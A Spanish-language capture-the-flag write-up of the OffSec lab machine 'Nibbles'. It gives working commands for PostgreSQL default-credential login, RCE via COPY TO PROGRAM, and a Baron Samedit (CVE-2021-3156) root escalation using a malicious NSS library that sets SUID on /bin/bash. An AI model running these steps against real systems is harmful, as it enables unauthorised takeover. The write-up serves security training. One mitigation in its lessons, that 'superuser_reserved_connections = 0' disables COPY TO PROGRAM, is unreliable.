---
title: "Nibbles"
description: "Writeup de la máquina Nibbles de OffSec Proving Grounds: credenciales por defecto en PostgreSQL 11 expuesto a internet permiten RCE como postgres vía COPY TO PROGRAM, y escalada a root explotando CVE-2021-3156 (Baron Samedit) con una librería NSS maliciosa que llama a chmod() directamente para evitar que el shell hijo descarte los privilegios SUID."
date: 2026-11-22
creator: "OffSec"
rating: 4.0
dificultad: "Fácil"
author: "Ghxstsec"
draft: false
type: "post"
---

Nibbles | OffSec Proving Grounds Writeup
========================================

**Plataforma:** OffSec Proving Grounds · **SO:** Linux · **Dificultad:** Fácil

Nibbles expone un servidor PostgreSQL 11 en el puerto 5437 accesible desde internet con
las credenciales por defecto `postgres:postgres`. El rol tiene permisos de superusuario,
lo que habilita la primitiva `COPY TO PROGRAM` para ejecutar comandos arbitrarios como el
usuario `postgres`. Desde ahí, la máquina corre **sudo 1.8.27** sobre Debian 10 buster —
versión afectada por **CVE-2021-3156 (Baron Samedit)** — lo que permite elevar a root
sin ninguna contraseña. Un detalle importante: el firewall del host solo permite
tráfico entrante en los puertos del servicio, por lo que toda la operación se realiza
íntegramente a través del canal PostgreSQL.

---

## Reconocimiento

```bash
nmap -sC -sV -p- --min-rate 3000 -T4 192.168.122.47
```

```
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp   open   http         Apache httpd 2.4.38 (Debian)
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
```

El puerto **5437** llama la atención: PostgreSQL escuchando en todas las interfaces.
El servidor HTTP solo sirve páginas estáticas y no hay nada relevante tras un
escaneo de directorios completo con feroxbuster y raft-medium-directories.

---

## Acceso inicial — PostgreSQL credenciales por defecto

### Verificación de credenciales

```bash
psql -h 192.168.122.47 -p 5437 -U postgres -d postgres
# contraseña: postgres
```

```
postgres=# \du
                   List of roles
 Role name |                         Attributes
-----------+----------------------------------------------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS
```

El rol `postgres` es superusuario. En PostgreSQL, eso habilita la función
`COPY ... TO/FROM PROGRAM`, que ejecuta un comando de shell arbitrario en el
contexto del proceso del servidor.

### RCE con COPY TO PROGRAM

```sql
-- Verificar ejecución de comandos
DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(o text);
COPY cmd FROM PROGRAM 'id';
SELECT o FROM cmd;
```

```
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

RCE confirmado. Desde este punto se usa PostgreSQL como canal de ejecución
persistente durante toda la explotación, ya que el firewall del host bloquea
cualquier conexión TCP entrante salvo los puertos del servicio (21/22/80/5437).

```bash
# Alias conveniente para ejecutar comandos remotos
pgrun() {
  PGPASSWORD=postgres psql -h 192.168.122.47 -p 5437 -U postgres -d postgres -t -A -c "
  DROP TABLE IF EXISTS r; CREATE TABLE r(o text);
  COPY r FROM PROGRAM \$\$ bash -c '{ $1; } 2>&1' \$\$;
  SELECT o FROM r;"
}
```

### Flag de usuario

```bash
pgrun "cat /home/wilson/local.txt"
```

```
a18f1ebe04b2e5d2b1f227164e52a27f
```

`/home/wilson/local.txt` tiene permisos de lectura para todos (`-rw-r--r--`), por
lo que el usuario `postgres` puede leerlo directamente.

---

## Escalada de privilegios — CVE-2021-3156 (Baron Samedit)

### Identificación de la vulnerabilidad

```bash
pgrun "sudo --version | head -1; cat /etc/os-release | grep PRETTY"
```

```
Sudo version 1.8.27
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
```

**sudo 1.8.27 en Debian 10** — exactamente uno de los objetivos listados en el
módulo de Metasploit para CVE-2021-3156. Los parámetros para esta combinación
son `64 49 60 214`.

### Qué hace la vulnerabilidad

Baron Samedit es un *heap-based buffer overflow* en el parsing de argumentos de
`sudoedit`. Si el último carácter del argumento es una barra invertida (`\`),
`sudo` entra en un bucle donde incrementa un puntero más allá del final del
buffer reservado en el heap. Esto permite sobrescribir estructuras adyacentes —
en particular, el puntero a la ruta del módulo NSS que usa el sistema de
resolución de nombres.

El exploit redirige ese puntero a una librería `.so.2` controlada por el
atacante, que `sudo` carga con sus **privilegios elevados de root** mientras
procesa la solicitud.

### Preparar el payload

La librería maliciosa debe llamar a `chmod()` **directamente como función de
libc**, no mediante `system()`. El motivo: `system()` lanza `/bin/sh -c "..."`,
y cuando bash/sh hereda un contexto SUID detecta que el UID real difiere del
efectivo y descarta los privilegios antes de ejecutar el comando. La llamada
directa a la syscall no tiene esa restricción.

```c
// pwn.c — se compila en el atacante, se sube al objetivo vía base64
#include <sys/stat.h>

void __attribute__((constructor)) pwn() {
    chmod("/bin/bash", 04755);   // llamada directa a libc, no fork+exec
}
```

```bash
# Compilar como .so en el atacante
mkdir -p /tmp/libnss_P
gcc -shared -fPIC -nostartfiles \
    -o '/tmp/libnss_P/Q .so.2' \
    pwn.c
```

> **Nota sobre el nombre del archivo:** el exploit `nss_generic1.py` construye
> la ruta como `libnss_<overwrite>/dir .so.2` (con un espacio antes de `.so.2`)
> cuando `lib_needs_space: true`. El prefijo `P/Q` es nuestro `overwrite_path`
> elegido; la carpeta destino en el objetivo será `/tmp/libnss_P/`.

### Subir los archivos al objetivo via PostgreSQL

Como no hay conexión HTTP saliente ni `curl` en el objetivo, se codifican los
binarios en base64 y se inyectan a través de `COPY TO PROGRAM`:

```bash
# Script de explotación
PY_B64=$(base64 -w0 /path/to/nss_generic1.py)
SO_B64=$(base64 -w0 '/tmp/libnss_P/Q .so.2')

# Subir script Python
PGPASSWORD=postgres psql ... -c "
  COPY (SELECT 1) TO PROGRAM
  \$\$ bash -c \"echo $PY_B64 | base64 -d > /tmp/nss_generic1.py\" \$\$;"

# Crear directorio y subir librería
PGPASSWORD=postgres psql ... -c "
  COPY (SELECT 1) TO PROGRAM 'mkdir -p /tmp/libnss_P';"

PGPASSWORD=postgres psql ... -c "
  COPY (SELECT 1) TO PROGRAM
  \$\$ bash -c \"echo $SO_B64 | base64 -d > '/tmp/libnss_P/Q .so.2'\" \$\$;"
```

### Ejecutar el exploit

```bash
pgrun "python3 /tmp/nss_generic1.py 64 49 60 214 P/Q /tmp 2>&1; true"
```

Verificación:

```bash
pgrun "ls -la /bin/bash"
```

```
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

El bit SUID está establecido.

### Obtener root

```bash
pgrun "/bin/bash -p -c 'id; cat /root/proof.txt'"
```

```
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
50381cc27ec94c1eb14834f7da82e8ae
```

---

## Cadena de ataque

```
PostgreSQL 5437 — credenciales por defecto (postgres:postgres)
        │
        ▼
   Superusuario → COPY FROM/TO PROGRAM → RCE como postgres
        │
        ├─ /home/wilson/local.txt (world-readable) → flag de usuario
        │
        ▼
   sudo 1.8.27 en Debian 10 → CVE-2021-3156 (Baron Samedit)
   .so maliciosa con chmod() directo (sin system/shell)
   subida vía base64 sobre canal PostgreSQL
        │
        ▼
   /bin/bash +s → bash -p → euid=0 → flag de root
```

---

## Lecciones

- **PostgreSQL nunca debe escuchar en 0.0.0.0** sin restricción de IP; si necesita
  acceso remoto, que sea solo desde hosts conocidos vía `pg_hba.conf`.
- **Cambiar siempre las credenciales por defecto** en servicios de base de datos —
  especialmente en un entorno accesible por red.
- **`COPY TO/FROM PROGRAM` es una primitiva de RCE directa** para cualquier
  superusuario de PostgreSQL; en instalaciones que no lo necesitan debe deshabilitarse
  con `superuser_reserved_connections = 0` y revocando el rol superusuario de los
  usuarios de aplicación.
- **El bug `system()` en constructores de .so SUID:** cuando una librería se carga en
  el contexto de un binario SUID, `system()` y `popen()` invocan un shell que detecta
  la discrepancia UID real / efectivo y descarta los privilegios. Para modificar el
  sistema de ficheros desde ese constructor hay que usar las llamadas de libc
  directamente (`chmod()`, `open()`, `write()`, etc.) o syscalls directas.
